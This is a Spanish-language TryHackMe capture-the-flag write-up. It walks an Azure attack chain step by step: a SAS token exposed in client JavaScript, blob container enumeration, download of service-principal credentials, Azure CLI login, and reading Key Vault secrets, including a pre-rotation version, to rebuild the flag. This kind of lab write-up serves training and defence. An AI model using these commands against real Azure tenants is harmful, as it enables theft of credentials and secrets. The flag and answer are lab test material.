CryptoCabana Cloud — de un SAS Token expuesto a los secretos del Key Vault

Fecha: 5 ago 2026 Categoría: Cloud / Azure Sistema: Azure (Storage Account + Key Vault) Plataforma: TryHackMe (HackerHolidays · Byte Lotus · Día 9)

Resumen

El escenario describe un servicio de backup de seed phrases alojado en Azure que prometía seguridad con el mensaje "Backed up. Sleep easy." El objetivo era descubrir qué identidad utiliza la aplicación para acceder al almacenamiento y comprobar hasta dónde llegan sus permisos. Un SAS Token de solo lectura expuesto en el JavaScript del cliente permite enumerar la cuenta de almacenamiento y descargar las credenciales de una cuenta de automatización, con las que se accede al Key Vault asociado; una versión antigua de un secreto ya rotado permite reconstruir la flag completa.

Artefactos y herramientas

  • Código JavaScript del cliente — expone el SAS Token y el storage account
  • API REST de Azure Blob Storage — enumeración de contenedores con el SAS Token
  • az (Azure CLI) — login con Service Principal y enumeración del Key Vault

Análisis

1. Análisis del código JavaScript

Objetivo: localizar credenciales o tokens expuestos en el cliente.

Inspeccionando el código fuente de la aplicación aparecen el storage account, el contenedor y un SAS Token completo:

const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";

const BACKUP_SAS =
"?sv=2022-11-02&ss=b&srt=sco&sp=rl&...";

El parámetro sp=rl del SAS indica permisos de Read y List únicamente — no existían permisos de escritura.

2. Enumeración de contenedores

Objetivo: listar los contenedores accesibles con el SAS Token.
https://cryptocabanaf5scjagc.blob.core.windows.net/
?restype=container
&comp=list
&SAS_TOKEN

Respuesta obtenida:

$web
backups
vault

El contenedor más interesante era vault.

3. Enumeración del contenedor vault

Objetivo: ver qué archivos contiene el contenedor vault.
https://cryptocabanaf5scjagc.blob.core.windows.net/vault
?restype=container
&comp=list
&SAS_TOKEN

Resultado:

backup-service-account.json
seed_phrase.txt

4. Obtención de credenciales

Objetivo: extraer credenciales válidas del archivo de la cuenta de servicio.

Descargando backup-service-account.json se encuentran credenciales válidas:

{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "REDACTED",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "key_vault_name": "ccabana-kv-f5scjagc"
}

La nota asociada ("Rotate this if it ever leaves the vault.") confirma que se trata de una cuenta de automatización utilizada por la propia aplicación.

5. Acceso mediante Service Principal

Objetivo: autenticarse en Azure con las credenciales obtenidas.
az login --service-principal \
  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  -p <client_secret> \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c

Resultado: autenticación exitosa como la cuenta de automatización.

6. Enumeración de Azure Key Vault

Objetivo: listar los secretos disponibles en el Key Vault asociado.
az keyvault secret list \
  --vault-name ccabana-kv-f5scjagc \
  -o table

Resultado:

key-shard-1
key-shard-2
key-shard-3
master-key

7. Recuperación de los fragmentos

Objetivo: leer el valor de cada fragmento de la flag.
# Shard 1
THM{n0t_ur

# Shard 2
Rotated this after IT flagged it --
old value should still be recoverable if you know where to look.

# Shard 3
ur_c01ns!}

El segundo secreto resulta estar rotado: su valor actual ya no es el fragmento de la flag, sino una pista apuntando a su versión anterior.

8. Enumeración de versiones antiguas

Objetivo: recuperar el valor anterior a la rotación de key-shard-2.
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2

Existían dos versiones. Se identifica la más antigua:

3d6492d2c6f74123bc754a9ded22b2a0

Y se recupera su valor:

az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0

Resultado:

_k3ys_n0t_

9. Reconstrucción de la flag

THM{n0t_ur
_k3ys_n0t_
ur_c01ns!}

Flag: THM{n0t_ur_k3ys_n0t_ur_c01ns!}

Cadena de ataque (kill chain)

#Paso
1SAS Token de solo lectura expuesto en el JavaScript del cliente
2Enumeración del storage account: contenedores $web, backups y vault
3Enumeración de vault: backup-service-account.json y seed_phrase.txt
4Descarga de credenciales de una cuenta de automatización (Service Principal)
5Login en Azure CLI con el Service Principal
6Enumeración del Key Vault asociado: cuatro secretos (3 shards + master-key)
7Lectura de los tres shards; key-shard-2 aparece ya rotado
8Enumeración de versiones antiguas de key-shard-2 y recuperación del valor previo a la rotación
9Reconstrucción de la flag a partir de los tres fragmentos

Conclusiones

Los SAS Tokens mal configurados o incrustados en código del cliente pueden exponer almacenamiento sensible aunque solo tengan permisos de lectura, porque "solo lectura" sigue permitiendo descargar credenciales de otras cuentas con más privilegios. Las cuentas de automatización suelen tener acceso privilegiado y conviene tratarlas con el mismo cuidado que una cuenta humana. Además, rotar un secreto en Azure Key Vault no elimina necesariamente las versiones anteriores: si no se purgan explícitamente, siguen siendo recuperables por cualquiera con permisos de lectura sobre el histórico de versiones, lo que puede anular por completo el propósito de la rotación.
